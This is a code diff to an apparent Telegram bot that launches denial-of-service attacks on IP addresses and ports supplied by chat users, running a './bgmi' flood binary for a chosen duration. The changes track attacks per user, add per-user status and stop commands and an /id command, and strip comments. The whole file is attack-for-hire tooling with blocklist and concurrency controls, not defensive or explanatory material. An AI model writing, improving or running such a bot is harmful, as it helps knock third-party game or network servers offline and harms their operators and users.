@@ -17,11 +17,10 @@ attack_semaphore = Semaphore(2)
 active_attacks = {}
 user_profiles = {}
 
-# Ensure the files are created if they do not exist
 def ensure_file_exists(filename):
     if not os.path.exists(filename):
         with open(filename, 'w') as f:
-            pass  # Create an empty file
+            pass
 
 ensure_file_exists(BLOCKLIST_FILE)
 ensure_file_exists(USER_PROFILES_FILE)
@@ -62,18 +61,21 @@ def unblock_user(user_id):
     blocklist.discard(user_id)
     save_blocklist(blocklist)
 
-def run_attack(target_ip, target_port, attack_duration):
+def run_attack(user_id, target_ip, target_port, attack_duration):
     global active_attacks
     try:
         process = subprocess.Popen(["./bgmi", target_ip, str(target_port), "1", "12"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        active_attacks[(target_ip, target_port)] = process.pid
+        if user_id not in active_attacks:
+            active_attacks[user_id] = []
+        active_attacks[user_id].append((target_ip, target_port, process.pid))
         time.sleep(attack_duration)
-        pid = active_attacks.pop((target_ip, target_port), None)
-        if pid:
+        attack = next((a for a in active_attacks[user_id] if a[0] == target_ip and a[1] == target_port), None)
+        if attack:
             try:
-                subprocess.run(["kill", str(pid)], check=True)
+                subprocess.run(["kill", str(attack[2])], check=True)
             except subprocess.CalledProcessError as e:
-                logging.error(f"Failed to kill process with PID {pid}: {e}")
+                logging.error(f"Failed to kill process with PID {attack[2]}: {e}")
+            active_attacks[user_id].remove(attack)
     finally:
         attack_semaphore.release()
 
@@ -93,8 +95,9 @@ def help_command(message):
     /help - Show this help message
     /blocklist <add/remove> <user_id> - Manage the blocklist (Admin only)
     /status - Check the status of active attacks
-    /end - Stop all active attacks
+    /end - Stop your active attacks
     /feedback <your feedback> - Submit feedback or suggestions
+    /id - Show your user ID
     """
     bot.send_message(message.chat.id, help_text)
 
@@ -124,12 +127,12 @@ def status_command(message):
     if is_user_blocked(user_id):
         bot.send_message(message.chat.id, "*You are blocked from using this bot ⚠*", parse_mode='Markdown')
         return
-    if not active_attacks:
+    if user_id not in active_attacks or not active_attacks[user_id]:
         bot.send_message(message.chat.id, "No active attacks.")
         return
     status_message = "Active attacks:\n"
-    for (target_ip, target_port) in active_attacks.keys():
-        status_message += f"- Target: {target_ip}:{target_port}\n"
+    for attack in active_attacks[user_id]:
+        status_message += f"- Target: {attack[0]}:{attack[1]}\n"
     bot.send_message(message.chat.id, status_message)
 
 @bot.message_handler(commands=['feedback'])
@@ -166,7 +169,7 @@ def handle_attack(message):
             bot.send_message(message.chat.id, "*Maximum concurrent attacks reached. Please wait.*", parse_mode='Markdown')
             return
         bot.send_message(message.chat.id, f"Starting attack on {target_ip}:{target_port} for {attack_duration} seconds.")
-        attack_thread = Thread(target=run_attack, args=(target_ip, target_port, attack_duration))
+        attack_thread = Thread(target=run_attack, args=(user_id, target_ip, target_port, attack_duration))
         attack_thread.start()
     except ValueError:
         bot.send_message(message.chat.id, "*Invalid input. Ensure port and attack duration are numbers.*", parse_mode='Markdown')
@@ -177,12 +180,20 @@ def end_all_attacks(message):
     if is_user_blocked(user_id):
         bot.send_message(message.chat.id, "*You are blocked from using this bot ⚠*", parse_mode='Markdown')
         return
-    for (target_ip, target_port), pid in list(active_attacks.items()):
+    if user_id not in active_attacks or not active_attacks[user_id]:
+        bot.send_message(message.chat.id, "No active attacks to stop.")
+        return
+    for attack in active_attacks[user_id]:
         try:
-            subprocess.run(["kill", str(pid)], check=True)
-            bot.send_message(message.chat.id, f"Attack on {target_ip}:{target_port} has been stopped.")
+            subprocess.run(["kill", str(attack[2])], check=True)
+            bot.send_message(message.chat.id, f"Attack on {attack[0]}:{attack[1]} has been stopped.")
         except subprocess.CalledProcessError as e:
-            logging.error(f"Failed to kill process with PID {pid}: {e}")
-        active_attacks.pop((target_ip, target_port), None)
+            logging.error(f"Failed to kill process with PID {attack[2]}: {e}")
+    active_attacks[user_id] = []
+
+@bot.message_handler(commands=['id'])
+def show_id(message):
+    user_id = message.from_user.id
+    bot.send_message(message.chat.id, f"Your user ID is: {user_id}")
 
 bot.polling(none_stop=True)
